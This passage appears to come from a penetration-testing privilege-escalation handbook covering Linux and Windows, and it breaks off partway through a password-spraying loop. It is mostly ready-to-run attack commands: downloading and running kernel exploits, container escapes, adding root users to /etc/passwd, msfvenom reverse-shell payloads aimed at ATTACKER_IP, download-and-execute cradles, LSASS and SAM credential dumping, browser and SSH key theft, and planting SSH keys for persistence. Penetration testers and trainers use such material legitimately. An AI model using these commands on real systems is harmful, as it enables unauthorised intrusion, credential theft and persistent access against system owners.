**üîç Kernel Information**

```bash
# Kernel version
uname -a
uname -r
cat /proc/version

# Distribution
cat /etc/issue
cat /etc/os-release
lsb_release -a 2>/dev/null

# Architecture
uname -m
arch
getconf LONG_BIT

# Check kernel messages for hints
dmesg | grep -i "linux version"
```

**üîé Automated Exploit Suggesters**

```bash
# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Alternative: Linux Exploit Suggester 2
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
perl linux-exploit-suggester-2.pl

# Check for specific CVEs
searchsploit linux kernel $(uname -r)
searchsploit privilege escalation | grep -i linux
```

**üéØ Notable Kernel Exploits**

|CVE|Name|Affected Versions|Description|
|---|---|---|---|
|CVE-2022-0847|Dirty Pipe|Linux 5.8+|Overwrite read-only files|
|CVE-2021-4034|PwnKit|polkit < 0.120|Local privilege escalation|
|CVE-2021-3493|OverlayFS|Ubuntu kernels|Ubuntu-specific privilege escalation|
|CVE-2017-16995|-|Linux < 4.14.11|BPF privilege escalation|
|CVE-2016-5195|Dirty COW|Linux 2.6.22 - 4.8.3|Race condition in memory subsystem|
|CVE-2015-1328|OverlayFS|Ubuntu 12.04/14.04/14.10/15.04|Ubuntu overlayfs local root|
|CVE-2010-3904|RDS|Linux < 2.6.36|Reliable Datagram Sockets exploit|
|CVE-2009-2698|udp_sendmsg|Linux < 2.6.19|NULL pointer dereference|

**üí• Dirty Pipe (CVE-2022-0847) Example**

```bash
# Download exploit
wget https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
gcc exploit-1.c -o exploit

# Run exploit
./exploit
```

**üí• PwnKit (CVE-2021-4034) Example**

```bash
# Download exploit
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
chmod +x PwnKit
./PwnKit
```

**üí• Dirty COW (CVE-2016-5195) Example**

```bash
# Download exploit
searchsploit -m 40839
gcc -pthread 40839.c -o dcow -lcrypt

# Run exploit
./dcow
```

### 4.3.7 Container Escape

**üîç Detect Container Environment**

```bash
# Check for Docker
ls -la /.dockerenv
cat /proc/1/cgroup | grep -i docker
cat /.dockerenv 2>/dev/null

# Check for LXC/LXD
cat /proc/1/environ | grep container=lxc
ls -la /var/lib/lxd/ 2>/dev/null

# Check for other containers
systemd-detect-virt
cat /proc/self/cgroup

# Check if privileged container
cat /proc/1/status | grep CapEff
# Compare with: CapEff: 0000003fffffffff (privileged)
```

**üéØ Container Escape Techniques**

**1. Privileged Container Escape:**

```bash
# If container is privileged, mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash
```

**2. Docker Socket Exposure:**

```bash
# If /var/run/docker.sock is accessible
ls -la /var/run/docker.sock

# Create privileged container and mount host
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# Alternative: execute command on host
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**3. LXD Container Escape:**

```bash
# If member of lxd group
lxc image list
lxc init ubuntu:18.04 privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/bash
cd /mnt/root/root
```

**4. CAP_SYS_ADMIN Escape:**

```bash
# Create exploit
mkdir /tmp/exploit
mount -t cgroup -o rdma cgroup /tmp/exploit
mkdir /tmp/exploit/x
echo 1 > /tmp/exploit/x/notify_on_release

# Get host path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/exploit/release_agent

# Create payload on host
echo '#!/bin/sh' > /cmd
echo "chmod +s /bin/bash" >> /cmd
chmod a+x /cmd

# Trigger
sh -c "echo \$\$ > /tmp/exploit/x/cgroup.procs"
sleep 1
/bin/bash -p
```

### 4.3.8 Interesting Group Memberships

**üîç Check Group Memberships**

```bash
id
groups
cat /etc/group | grep $(whoami)
```

**üéØ Exploitable Groups**

|Group|Exploitation Method|Priority|
|---|---|---|
|**docker**|Run privileged container|CRITICAL|
|**lxd**|LXD container escape|CRITICAL|
|**disk**|Direct disk access|CRITICAL|
|**video**|Access framebuffer|HIGH|
|**root**|Often equivalent to root|CRITICAL|
|**shadow**|Read /etc/shadow|HIGH|
|**sudo**|Likely can use sudo|HIGH|
|**adm**|Read log files|MEDIUM|
|**staff**|Write to /usr/local|MEDIUM|
|**kmem**|Kernel memory access|HIGH|

**üí• Docker Group Exploitation:**

```bash
# Run privileged container and mount host filesystem
docker run -v /:/hostfs -it ubuntu chroot /hostfs bash

# Alternative methods
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker run -v /etc:/mnt -it ubuntu cat /mnt/shadow
```

**üí• Disk Group Exploitation:**

```bash
# List block devices
lsblk
fdisk -l 2>/dev/null

# Read entire disk
debugfs /dev/sda1
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow

# Or mount directly
mkdir /tmp/mnt
mount /dev/sda1 /tmp/mnt
cat /tmp/mnt/etc/shadow
```

**üí• Shadow Group Exploitation:**

```bash
# Read shadow file
cat /etc/shadow

# Crack passwords offline
unshadow /etc/passwd /etc/shadow > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

**üí• ADM Group Exploitation:**

```bash
# Read sensitive logs
cat /var/log/apache2/access.log | grep password
cat /var/log/auth.log | grep password
cat /var/log/syslog | grep -i password
```

### 4.3.9 NFS Exploitation

**üîç NFS Enumeration**

```bash
# Check NFS exports
cat /etc/exports
showmount -e localhost
showmount -e <TARGET_IP>

# Check mounted NFS shares
mount | grep nfs
df -h | grep nfs
cat /proc/mounts | grep nfs
```

**üéØ no_root_squash Exploitation**

```bash
# If /etc/exports contains no_root_squash:
# /share *(rw,no_root_squash)

# On attacker machine (as root):
mkdir /tmp/nfs
mount -t nfs <TARGET_IP>:/share /tmp/nfs

# Create SUID binary
cat > /tmp/nfs/shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setuid(0); setgid(0); system("/bin/bash");
}
EOF

gcc /tmp/nfs/shell.c -o /tmp/nfs/shell
chmod +s /tmp/nfs/shell

# On target (as low-priv user):
cd /share
./shell
```

### 4.3.10 Writable /etc/passwd & /etc/shadow

**üí• Writable /etc/passwd Exploitation**

```bash
# Check if writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt salt password123
# Output: $1$salt$qVR7HRO59TLcCKGLXyXQZ.

# Add new root user
echo 'newroot:$1$salt$qVR7HRO59TLcCKGLXyXQZ.:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch to new user
su newroot
# Password: password123

# Alternative: Remove root password
sed -i 's/^root:[^:]*:/root::/' /etc/passwd
su root
# No password required
```

**üí• Writable /etc/shadow Exploitation**

```bash
# Check if writable
ls -la /etc/shadow

# Generate password hash
mkpasswd -m sha-512 password123

# Replace root's password hash
# Edit /etc/shadow and replace root's hash

# Or remove root password
sed -i 's/^root:[^:]*:/root::/' /etc/shadow
su root
```

---

## 4.4 Windows Automated Enumeration

### 4.4.1 WinPEAS (Windows Privilege Escalation Awesome Script)

**üöÄ Download & Execute**

```powershell
# Download and execute
certutil -urlcache -f http://ATTACKER_IP/winPEASx64.exe winpeas.exe
.\winpeas.exe

# Quiet mode (less output)
.\winpeas.exe quiet

# Save output to file
.\winpeas.exe > winpeas_output.txt

# Specific checks
.\winpeas.exe systeminfo
.\winpeas.exe userinfo
.\winpeas.exe processinfo
.\winpeas.exe servicesinfo
.\winpeas.exe applicationsinfo

# All checks with output
.\winpeas.exe cmd > winpeas_full.txt
```

**Alternative download methods:**

```cmd
# PowerShell
powershell -c "IEX(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/winPEAS.exe','winpeas.exe')"

# BITSAdmin
bitsadmin /transfer myDownloadJob /download /priority normal http://ATTACKER_IP/winpeas.exe C:\Temp\winpeas.exe
```

### 4.4.2 PowerUp

**üöÄ Download & Execute**

```powershell
# Download and import
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific checks
Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
Find-PathDLLHijack
Get-ModifiableRegistryAutoRun
Get-ModifiableScheduledTaskFile
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-RegAlwaysInstallElevated

# Abuse functions
Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program Files\Service\service.exe'
Install-ServiceBinary -Name 'VulnService'
Restore-ServiceBinary -Name 'VulnService'
```

### 4.4.3 Seatbelt

**üöÄ Download & Execute**

```cmd
# Download
certutil -urlcache -f http://ATTACKER_IP/Seatbelt.exe Seatbelt.exe

# Run all checks
Seatbelt.exe -group=all

# Specific groups
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe -group=misc
Seatbelt.exe -group=remote

# Save output
Seatbelt.exe -group=all -outputfile=C:\Temp\seatbelt.txt

# Specific checks
Seatbelt.exe TokenPrivileges
Seatbelt.exe WindowsCredentialFiles
Seatbelt.exe AMSIProviders
Seatbelt.exe ARPTable
```

### 4.4.4 Analyzing Automated Results

**Priority Findings:**

1. **CRITICAL**¬†- Immediate privilege escalation
    
    - SeImpersonatePrivilege/SeAssignPrimaryToken enabled
    - AlwaysInstallElevated enabled
    - Unquoted service paths with writable directories
    - Writable service binaries
    - Stored credentials (Autologon, WiFi passwords)
2. **HIGH**¬†- Likely privilege escalation
    
    - Weak service permissions
    - Modifiable scheduled tasks
    - DLL hijacking opportunities
    - Interesting registry keys
3. **MEDIUM**¬†- Requires investigation
    
    - Kernel exploit suggestions
    - Interesting file permissions
    - Potential password locations

---

## 4.5 Windows Manual Privilege Escalation

### 4.5.1 Windows Token Privileges

**üîç Enumerate Privileges**

```cmd
whoami /priv
whoami /groups
whoami /all
```

**üéØ Exploitable Privileges**

|Privilege|Tool|Exploitation|Priority|
|---|---|---|---|
|**SeImpersonatePrivilege**|PrintSpoofer, GodPotato|Token impersonation|CRITICAL|
|**SeAssignPrimaryTokenPrivilege**|JuicyPotato|Assign primary token|CRITICAL|
|**SeBackupPrivilege**|Robocopy, Diskshadow|Backup any file|HIGH|
|**SeRestorePrivilege**|-|Restore any file|HIGH|
|**SeTakeOwnershipPrivilege**|takeown, icacls|Take ownership|HIGH|
|**SeDebugPrivilege**|Procdump|Debug/inject processes|HIGH|
|**SeLoadDriverPrivilege**|-|Load kernel drivers|HIGH|
|**SeManageVolumePrivilege**|-|Manage disk volumes|MEDIUM|

**üí• SeImpersonatePrivilege Exploitation**

```cmd
# Check Windows version
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Windows 10 / Server 2016-2022: PrintSpoofer
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c powershell

# Windows Server 2019+: GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators <USER> /add"

# Older Windows: JuicyPotato
# Find CLSID for your Windows version from https://github.com/ohpe/juicy-potato/tree/master/CLSID
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}

# RoguePotato
RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe"
```

**üí• SeBackupPrivilege Exploitation**

```cmd
# Backup SAM and SYSTEM hives
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive

# Use diskshadow to backup files
# Create script
echo set context persistent nowriters > diskshadow.txt
echo add volume c: alias someAlias >> diskshadow.txt
echo create >> diskshadow.txt
echo expose %someAlias% z: >> diskshadow.txt
diskshadow /s diskshadow.txt

# Copy files
robocopy /b z:\Windows\NTDS . ntds.dit
```

**üí• SeTakeOwnershipPrivilege Exploitation**

```cmd
# Take ownership of a file
takeown /f C:\Windows\System32\config\SAM
icacls C:\Windows\System32\config\SAM /grant %username%:F

# Take ownership recursively
takeown /f C:\Windows\System32\config /r /d y
```

**üí• SeDebugPrivilege Exploitation**

```cmd
# Dump LSASS memory
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Inject into process
# Use tools like: Invoke-ReflectivePEInjection
```

### 4.5.2 Service Exploitation

**üîç Service Enumeration**

```cmd
# List all services
sc query
sc query state=all
wmic service get name,displayname,pathname,startmode

# Detailed service info
sc qc <ServiceName>
sc query <ServiceName>

# Services running as SYSTEM
wmic service where "startname='LocalSystem'" get name,pathname

# Services not in System32
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Check service permissions
sc sdshow <ServiceName>
accesschk.exe /accepteula -uwcv <ServiceName>
accesschk.exe /accepteula -ucqv <ServiceName>

# Check executable permissions
icacls "C:\Program Files\Service\service.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\Service\service.exe"
```

**üéØ Unquoted Service Paths**

```cmd
# Find unquoted service paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """

# PowerShell method
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike '*"*' -and $_.PathName -like '* *'} | Select Name, PathName

# If path is: C:\Program Files\Vulnerable Service\service.exe
# Windows searches in order:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe
# C:\Program Files\Vulnerable Service\service.exe

# Check writable directories
icacls "C:\Program Files"
accesschk.exe /accepteula -uwdq "C:\Program Files\"

# Place malicious executable
copy C:\Temp\malicious.exe "C:\Program.exe"

# Restart service
sc stop <ServiceName>
sc start <ServiceName>

# Or wait for reboot
shutdown /r /t 0
```

**üéØ Weak Service Permissions**

```cmd
# Check service permissions with accesschk
accesschk.exe /accepteula -uwcv * | findstr /i "SERVICE_ALL_ACCESS\|SERVICE_CHANGE_CONFIG"

# If you have SERVICE_CHANGE_CONFIG:
sc config <ServiceName> binPath= "cmd /c net localgroup administrators <USER> /add"
sc stop <ServiceName>
sc start <ServiceName>

# Alternative payload
sc config <ServiceName> binPath= "C:\Temp\reverse_shell.exe"

# Check if you can start/stop
sc start <ServiceName>
sc stop <ServiceName>
```

**üéØ Modifiable Service Binary**

```cmd
# Check binary permissions
icacls "C:\Program Files\Service\service.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\Service\service.exe"

# If writable, replace with malicious binary
# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe

# Backup original
move "C:\Program Files\Service\service.exe" "C:\Program Files\Service\service.exe.bak"

# Replace with malicious
copy C:\Temp\service.exe "C:\Program Files\Service\service.exe"

# Restart service
sc stop ServiceName
sc start ServiceName
```

### 4.5.3 Scheduled Tasks

**üîç Scheduled Task Enumeration**

```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v
schtasks /query /fo TABLE /nh

# Detailed XML output
schtasks /query /tn "TaskName" /xml
schtasks /query /fo LIST /v > tasks.txt

# PowerShell enumeration
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Format-Table TaskName,TaskPath,State
Get-ScheduledTask | Where-Object {$_.Principal.UserId -eq "SYSTEM"} | Format-Table TaskName,Actions

# Check permissions on task files
icacls C:\Windows\System32\Tasks
dir C:\Windows\System32\Tasks /s

# Check task directories
dir C:\Windows\Tasks
```

**üéØ Writable Scheduled Task Scripts**

```cmd
# Find scripts/executables run by tasks
schtasks /query /fo LIST /v | findstr /i "exe\|bat\|ps1\|cmd"

# Check permissions on scripts
icacls "C:\Path\To\Script.bat"
accesschk.exe /accepteula -quvw "C:\Path\To\Script.bat"

# If writable, modify script
echo net localgroup administrators <USER> /add >> C:\Path\To\Script.bat

# Or replace completely
echo cmd /c C:\Temp\reverse_shell.exe > C:\Path\To\Script.bat

# Wait for task execution or force run
schtasks /run /tn "TaskName"
```

### 4.5.4 AlwaysInstallElevated

**üîç Check Registry Settings**

```cmd
# Both registry keys must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# PowerShell check
Get-ItemProperty HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**üí• Exploitation**

```bash
# On attacker: Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi

# Alternative: add user to administrators
msfvenom -p windows/adduser USER=hacker PASS=Password123! -f msi -o adduser.msi
```

```cmd
# On target: Install MSI
msiexec /quiet /qn /i C:\Temp\shell.msi

# Alternative installation methods
msiexec /i C:\Temp\shell.msi /quiet
msiexec /q /i C:\Temp\shell.msi
```

### 4.5.5 Registry Exploitation

**üîç Registry Enumeration**

```cmd
# Autorun locations
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Startup folders
dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Check permissions on autorun entries
accesschk.exe /accepteula -wvu "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# PowerShell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

**üí• Writable Autorun Registry Keys**

```cmd
# If you have write access to Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\shell.exe"

# Or modify existing entry
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v UpdateService /t REG_SZ /d "C:\Temp\shell.exe" /f
```

### 4.5.6 File & Directory Permissions

**üîç Permission Enumeration**

```cmd
# Check writable directories
accesschk.exe /accepteula -uwdqs Users "C:\Program Files\"
accesschk.exe /accepteula -uwdqs "Authenticated Users" "C:\Program Files\"

# Check specific directory
icacls "C:\Program Files\Application"
accesschk.exe /accepteula -uwdq "C:\Program Files\Application"

# Check system directories
icacls "C:\Windows\System32"
icacls "C:\Windows\Temp"

# Find world-writable files
accesschk.exe /accepteula -uwqs Everyone "C:\Program Files\*"
```

**üí• Exploitable File Permissions**

```cmd
# If application directory is writable
# Replace legitimate DLL or EXE with malicious version

# Generate payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o malicious.exe

# Backup original
move "C:\Program Files\App\app.exe" "C:\Program Files\App\app.exe.bak"

# Replace
copy C:\Temp\malicious.exe "C:\Program Files\App\app.exe"

# Wait for execution or restart service
```

### 4.5.7 DLL Hijacking

**üîç Finding DLL Hijacking Opportunities**

```cmd
# Use Process Monitor (procmon.exe)
# Filter for "NAME NOT FOUND" and ".dll"

# Check DLL search order
# 1. Directory of the application
# 2. System directory (C:\Windows\System32)
# 3. 16-bit system directory
# 4. Windows directory (C:\Windows)
# 5. Current directory
# 6. Directories in PATH
```

**üí• DLL Hijacking Exploitation**

```c
// malicious.dll source code
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        system("cmd.exe /c net localgroup administrators <USER> /add");
        break;
    }
    return TRUE;
}
```

```bash
# Compile on Kali
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c

# Or use msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll
```

```cmd
# Place DLL in writable location in search order
copy C:\Temp\malicious.dll "C:\Program Files\Application\missing.dll"

# Restart application or wait for execution
```


### 4.5.8 Credential Dumping

**‚ö†Ô∏è Legal Notice:**¬†Only perform credential dumping where explicitly authorized in scope.

**üîì SAM & SYSTEM Registry Hives**

```cmd
# Save registry hives
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive

# Transfer to attacker machine and extract hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# Alternative: Direct registry dump
reg query HKLM\SAM
reg query HKLM\SECURITY
```

**üß† LSASS Memory Dumping**

```cmd
# Method 1: comsvcs.dll (DLL technique)
tasklist | findstr lsass
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Method 2: PowerShell
powershell -c "Get-Process lsass | Out-File lsass_pid.txt"
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Content lsass_pid.txt) C:\Temp\lsass.dmp full

# Method 3: Procdump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Method 4: Task Manager GUI
# Open Task Manager ‚Üí Details tab ‚Üí Right-click lsass.exe ‚Üí Create dump file
```

**Extract credentials on attacker machine:**

```bash
# Using pypykatz
pypykatz lsa minidump lsass.dmp

# Using mimikatz
mimikatz.exe
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPasswords
```

**üîë Windows Credential Manager**

```cmd
# List stored credentials
cmdkey /list

# VaultCmd
vaultcmd /list
vaultcmd /listschema
vaultcmd /listcreds:"Windows Credentials"

# PowerShell
Get-ChildItem -Path "C:\Users\*\AppData\Local\Microsoft\Credentials" -Force

# Dump credentials (requires SYSTEM)
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # vault::cred
```

**üíæ Unattended Installation Files**

```cmd
# Search for unattend files
dir /s C:\Windows\Panther\Unattend.xml
dir /s C:\Windows\Panther\Unattended.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattended.xml

# IIS web.config
dir /s C:\inetpub\wwwroot\web.config
type C:\inetpub\wwwroot\web.config | findstr connectionString

# Common password locations
type C:\Windows\System32\config\AppEvent.Evt
```

**üåê IIS Configuration Files**

```cmd
# IIS web.config files
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config

# ApplicationHost.config
type C:\Windows\System32\inetsrv\config\applicationHost.config

# Search for passwords
findstr /si password C:\inetpub\wwwroot\web.config
```

**üìù PowerShell History**

```powershell
# PowerShell command history
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath

# Search all users
dir C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**üóÇÔ∏è File Search for Credentials**

```cmd
# Search for common password files
dir /s /b C:\*password*.txt
dir /s /b C:\*password*.xml
dir /s /b C:\*password*.ini
dir /s /b C:\*pass*.txt
dir /s /b C:\*cred*.txt

# Search file contents
findstr /si password C:\*.txt C:\*.xml C:\*.ini C:\*.config

# Common locations
dir C:\Users\%username%\Desktop
dir C:\Users\%username%\Documents
dir C:\Users\%username%\Downloads

# Registry search
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

**üîê Saved RDP Connections**

```cmd
# RDP saved credentials
cmdkey /list
dir %USERPROFILE%\AppData\Local\Microsoft\Credentials\

# RDP connection history
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
```

**üì± WiFi Passwords**

```cmd
# List WiFi profiles
netsh wlan show profiles

# Extract password
netsh wlan show profile name="ProfileName" key=clear

# All WiFi passwords
for /f "tokens=2 delims=:" %i in ('netsh wlan show profiles ^| findstr "All User Profile"') do @echo Profile: %i & netsh wlan show profile name=%i key=clear | findstr "Key Content"
```

---

## 4.6 Credential Harvesting & Lateral Movement

### 4.6.1 History Files

**üêß Linux History Files**

```bash
# Bash history
cat ~/.bash_history
cat /home/*/.bash_history 2>/dev/null
cat /root/.bash_history 2>/dev/null

# Other shells
cat ~/.zsh_history 2>/dev/null
cat ~/.fish_history 2>/dev/null
cat ~/.sh_history 2>/dev/null

# Find all history files
find / -name ".*_history" 2>/dev/null
locate .bash_history
locate .mysql_history

# Application-specific history
cat ~/.mysql_history 2>/dev/null
cat ~/.psql_history 2>/dev/null
cat ~/.python_history 2>/dev/null
cat ~/.lesshst 2>/dev/null
cat ~/.viminfo 2>/dev/null

# Search history for passwords
grep -r "password" /home/*/.*_history 2>/dev/null
grep -r "passwd" /home/*/.*_history 2>/dev/null
```

**ü™ü Windows History Files**

```powershell
# PowerShell history (covered in 4.5.8)
type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Command prompt doesn't save history by default
# But check for F7 key buffer (if interactive session)

# Search for .txt files with passwords
dir C:\Users\%username%\*.txt /s | findstr /i password
```

### 4.6.2 Configuration Files

**üêß Linux Configuration Files**

```bash
# Web application configs
find /var/www -name "*.php" -o -name "*.conf" -o -name "config.*" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null | grep -v Binary

# Database configs
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
find / -name "wp-config.php" 2>/dev/null
find / -name "config.php" 2>/dev/null

# Application configs
cat /etc/mysql/my.cnf 2>/dev/null
cat /etc/postgresql/*/main/pg_hba.conf 2>/dev/null
cat /etc/apache2/sites-available/* 2>/dev/null
cat /etc/nginx/sites-available/* 2>/dev/null

# Environment files
cat .env 2>/dev/null
find / -name ".env" 2>/dev/null

# Search for passwords in configs
grep -r "password" /etc/ 2>/dev/null | grep -v Binary
grep -r "pass" /opt/ 2>/dev/null | grep -v Binary
```

**ü™ü Windows Configuration Files**

```cmd
# IIS configs (covered in 4.5.8)
type C:\inetpub\wwwroot\web.config

# Search all configs
dir /s /b C:\*.config | findstr /v "\.NET\|Windows\|Microsoft"
findstr /si "password\|connectionString" C:\inetpub\wwwroot\*.config

# Application configs
dir /s /b C:\Program Files\*config*
dir /s /b C:\Program Files (x86)\*config*
```

### 4.6.3 Database Credentials

**üêß Linux Database Files**

```bash
# MySQL
cat /etc/mysql/my.cnf
cat ~/.my.cnf 2>/dev/null
cat /var/lib/mysql/debian.cnf 2>/dev/null

# PostgreSQL
cat /etc/postgresql/*/main/pg_hba.conf
cat ~/.pgpass 2>/dev/null

# MongoDB
cat /etc/mongod.conf
cat ~/.mongorc.js 2>/dev/null

# SQLite databases
find / -name "*.db" -o -name "*.sqlite" -o -name "*.sqlite3" 2>/dev/null

# Redis
cat /etc/redis/redis.conf 2>/dev/null
```

**Connect to databases:**

```bash
# MySQL with found credentials
mysql -u root -p'PASSWORD' -h localhost
mysql -u root -p'PASSWORD' -e "SELECT user,password FROM mysql.user;"

# PostgreSQL
psql -U postgres -h localhost
psql -U user -d database -h localhost

# MongoDB
mongo -u admin -p 'PASSWORD' --authenticationDatabase admin
```

### 4.6.4 SSH Keys

**üîç Finding SSH Keys**

```bash
# Find private keys
find / -name "id_rsa" 2>/dev/null
find / -name "id_dsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Common locations
ls -la ~/.ssh/
ls -la /root/.ssh/ 2>/dev/null
ls -la /home/*/.ssh/ 2>/dev/null

# Find authorized_keys
find / -name "authorized_keys" 2>/dev/null

# Check permissions
ls -la ~/.ssh/id_rsa
```

**üí• Using Found SSH Keys**

```bash
# Copy key to attacker machine
cat /path/to/id_rsa

# On attacker, save and set permissions
chmod 600 id_rsa

# Connect
ssh -i id_rsa user@target

# If key is encrypted, crack it
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
john --show id_rsa.hash
```

**üîë Adding Your Own SSH Key**

```bash
# Generate key pair on attacker
ssh-keygen -f attack_key

# Add public key to target's authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2E... attacker@kali" >> ~/.ssh/authorized_keys

# Ensure proper permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

# Connect from attacker
ssh -i attack_key user@target
```

### 4.6.5 Browser Credentials

**ü™ü Windows Browser Locations**

```cmd
# Chrome
dir %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
dir %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies

# Firefox
dir %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\logins.json
dir %APPDATA%\Mozilla\Firefox\Profiles\*.default-release\key4.db

# Edge
dir %LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data

# Copy to attacker machine and extract with tools
```

**Extract with tools:**

```bash
# LaZagne (multi-platform password recovery)
laZagne.exe all

# SharpChrome
SharpChrome.exe logins
```

**üêß Linux Browser Locations**

```bash
# Chrome/Chromium
~/.config/google-chrome/Default/Login Data
~/.config/chromium/Default/Login Data

# Firefox
~/.mozilla/firefox/*.default-release/logins.json
~/.mozilla/firefox/*.default-release/key4.db
```

### 4.6.6 Credential Reuse & Password Spraying

**üîÅ Test Discovered Credentials**

```bash
# Create credential list
cat > creds.txt << EOF
admin:Password123
root:password
user:Welcome1
EOF

# SSH password spraying
for cred in $(cat creds.txt); do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
